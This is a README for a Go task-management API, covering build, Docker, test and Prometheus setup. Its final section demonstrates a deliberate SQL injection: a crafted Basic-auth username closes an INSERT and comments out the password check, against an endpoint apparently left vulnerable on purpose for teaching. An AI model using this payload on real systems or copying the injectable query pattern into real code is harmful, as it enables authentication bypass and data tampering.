## Run / Build

---

Run only

```shell
make run
```

Build only

```shell
make build
```

## Docker-compose

---

```shell
make c.build
```

```shell
make c.up
```

## Docs

---

http://127.0.0.1:45222/doc/index.html

## Tests

---

```shell
make tests
```

## Metrics

---

### Prometheus

```yaml
# prometheus.yml

- job_name: api-tm
  scrape_interval: 15s
  static_configs:
    - targets:
      - 127.0.0.1:45222
```

**api_tm_request_http_requests_total** - total number of requests, their methods and paths.

![Total requests](docs/grafana-example.png)

## Files

- _docs/*_ - swagger files(OpenAPI)
- _configs/conf.toml_ - settings
- _scripts/create_tables.sql_ - postgres tables 
- _logs/app.log_ - api errors 

## Manual run / building / generation

---

#### OpenAPI(generation)

```shell
swag init -g cmd/app/main.go
```

#### Tests

```shell
go test -failfast ./...
```

#### Run only

```shell
go run cmd/app/main.go
```

#### Build and run

```shell
go build -o apitm cmd/app/main.go
```

```shell
./apitm
```

#### Docker(local DB)

```shell
docker build . -t apitm:v0.1
```

```shell
docker run --rm --network=host apitm:v0.1
```

#### Docker-compose

```shell
docker-compose build
```

```shell
docker-compose up
```

## Example SQL-injection

---

### Create new user -> qwerty:qwerty 

```shell
curl -u admin:admin --location 'http://127.0.0.1:45222/api/v1/manage/user' \
--header 'Content-Type: application/json' \
--data '{
    "username": "qwerty",
    "password": "qwerty"
}'
```

### Create task with injection

USERNAME - **qwerty'), false, 'title', now(), now()) -- '**

PASSWORD - **any**

```shell
curl --location 'http://127.0.0.1:45222/api/v1/task/create-task-injection' \
--header 'Authorization: Basic cXdlcnR5JyksIGZhbHNlLCAnU1FMLWlJTkpFQ1RJT04nLCBub3coKSwgbm93KCkpIC0tICc6YW55' \
--header 'Content-Type: application/json' \
--data '{
    "title": "SQL INJECTION"
}'
```

#### Response - Internal Server Error(500)

```json
{
    "type": "INTERNAL",
    "comment": "create task"
}
```

#### But the task has been created. Because the request to the database:

```sql
INSERT INTO
    task(user_id, status, title, created, updated)
VALUES
    ((SELECT user_id FROM auth WHERE username = 'qwerty'), false, 'SQL-iINJECTION', now(), now()) -- '' AND password = 'df69d4a3aa4eca782c7cb526841c7e60fb6015806c2ef41df95bfa1afe8427a6'), false, 'SQL INJECTION', now(), now()) RETURNING  task_id  
```

#### DB rows

![Example SQL-injection](docs/sql-injection.png)




